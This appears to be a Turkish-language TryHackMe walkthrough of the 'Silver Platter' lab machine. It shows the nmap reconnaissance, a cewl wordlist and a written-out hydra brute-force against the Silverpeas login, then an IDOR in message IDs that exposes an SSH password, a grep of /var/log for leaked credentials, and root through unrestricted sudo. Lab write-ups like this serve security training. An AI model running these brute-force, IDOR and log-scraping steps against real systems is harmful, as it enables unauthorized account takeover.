---
title: 'TryHackMe | Silver Platter WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [brute force, log, idor, sudo]
render_with_liquid: false
media_subpath: /images/tryhackme_silver_platter/
image:
  path: logo.webp
---

## Özet

Silver Platter, web uygulamasındaki bilgilerden yararlanarak kaba kuvvet saldırısı yaptığımız kolay seviye bir makinedir. Uygulamaya giriş yaptıktan sonra mesajların bulunduğu alanda bir `IDOR` zafiyeti tespit edecek ve bu zafiyeti sömürerek SSH kullanıcı bilgilerini öğreneceğiz. Daha sonra log dosyalarından birinde bulduğumuz parola ile bir başka kullanıcıya geçiş yapacağız. Bulunduğumuz kullanıcının sudo yetkilerini kontrol ettiğimizde ise root haklarıyla istediğimiz komutları çalıştırabileceğimizi öğreneceğiz.

## Keşif aşaması

### Nmap taraması

```console
$nmap -sSVC -T4 10.10.53.94
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
...
```

### 80 numaralı portun incelenmesi

![](1.webp){: width="1200" height="600" }

Tyler Ramsbey tarafından yapılmış bir web uygulaması ile karşı karşıyayız. Uygulamanın amacını tam olarak anlamış değilim. Bazı yerlerde CTF'ler düzenledikleri, bazı yerlerde ise kurumların güvenliğini sağladıkları yazıyor. Sanırım bu iki işi de görüyorlar. İletişim sayfasına baktığımızda iletişim için bir kullanıcı adı verdiğini ve silverpeas üzerinden onlarla iletişim kurabileceğimiz belirtilmiş.

![](2.webp){: width="900" height="500" }

### 8080 numaralı portun incelenmesi

![](3.webp){: width="1200" height="600" }

Bahsettiği `silverpeas` uygulaması `8080` numaralı port üzerinde bulunuyor. İletişim kurmak için bu adrese sadece kullanıcı adı ile yönlendirdiğini düşünürsek, parolasının aynı kullanıcı adına sahip olduğunu veya varsayılan bilgileri içerdiğini düşünebiliriz ama değil. Cewl aracı ile 80 numaralı port üzerindeki web sitesindeki bilgilerden bir parola listesi oluşturalım. Daha sonra ise hydra aracından yararlanarak bir kaba kuvvet saldırısı başlatalım.

```console
$ cewl http://10.10.53.94 > passwords.txt
$ hydra -l scr1ptkiddy -P passwords.txt 10.10.53.94 -s 8080 http-post-form "/silverpeas/AuthenticationServlet?DomainId=0:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-31 09:49:00
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 345 login tries (l:1/p:345), ~22 tries per task
[DATA] attacking http-post-form://10.10.53.94:8080/silverpeas/AuthenticationServlet?DomainId=0:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect
[8080][http-post-form] host: 10.10.53.94   login: scr1ptkiddy   password: ***
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-31 09:49:19
```

Elde ettiğimiz kullanıcı bilgileri ile sisteme giriş yapalım.

![](4.webp){: width="1200" height="600" }

## Sömürü aşaması

![](5.webp){: width="1200" height="600" }

Sistemde `manager`, `scr1ptkiddy` ve `administrator` olmak üzere üç adet kullanıcı bulunuyor. Bu kullanıcılara mesaj gönderebiliyoruz. Bulunduğumuz kullanıcıya ise `manager` kullanıcısından "game night" başlığı altında bir mesaj gönderilmiş.

![](6.webp){: width="1200" height="600" }

scr1ptkiddy kullanıcısına gönderilen mesajda bir saat içinde bir VR oyununa başlayacaklarını ve katılmak isteyip istemediğini sorduğunu görüyoruz. Bu arada url yapısı dikkatimizi çekiyor. 

![](7.webp){: width="900" height="500" }

ID değerini her değiştirişimizde başka bir kullanıcının mesajı ile karşılaşıyoruz. 6 numaralı mesajı kontrol etmek istediğimizde ise `tim` kullanıcısının parolasını elde ediyoruz.

![](8.webp){: width="900" height="500" }

Kullanıcı bilgilerini kullanarak SSH servisine bağlandıktan sonra ilk bayrağı kullanıcının kendi dizininden alıyoruz.

## Yetki yükseltme

### tyler

`id` komutunu kullandıktan sonra `adm` grubunda olduğumuzu öğreniyoruz.

```console
tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

`adm` grubunda bulunan dosyaları listelediğimizde geneli log dosyalarından oluşan bir takım dosyalar ile karşılaşıyoruz.

```console
tim@silver-platter:~$ find / -group adm 2>/dev/null
/var/log/kern.log                                                                                                                                                                             
/var/log/syslog.3.gz                                                                                                                                                                          
/var/log/kern.log.2.gz                                                                                                                                                                        
/var/log/syslog.2.gz                                                                                                                                                                          
/var/log/auth.log.1                                                                                                                                                                           
/var/log/kern.log.1                                                                                                                                                                           
/var/log/dmesg.4.gz                                                                                                                                                                           
...
```

Haliyle bu log dosyalarından `tyler` kullanıcısının parolasını bulabileceğimi düşündüm ve grep komutu ile /var/log dizinindeki dosyaları kontrol ettim.

```console
tim@silver-platter:~$ grep "password" -iR /var/log 2>/dev/null | grep "tyler"
...
/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=*** -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
...
```

`auth.log` dosyası içerisinded `tyler` kullanıcısının parolasını buluyor ve kendisine geçiş yapıyoruz.

### root

`sudo` yetkilerimizi görüntülediğimizde herhangi bir kullanıcı adına istediğimiz tüm komutları çalıştırabileceğimizi öğreniyoruz.

```console
tyler@silver-platter:/home/tim$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) AL
```

`sudo su` komutunu kullanarak root kullanıcısına geçiş yapıyor ve son bayrağı kendi dizininden alıyoruz.

```console
tyler@silver-platter:/home/tim$ sudo su
root@silver-platter:/home/tim# cd /root
root@silver-platter:~# ls
root.txt  snap  start_docker_containers.sh
root@silver-platter:~# cat root.txt 
THM{***}
```
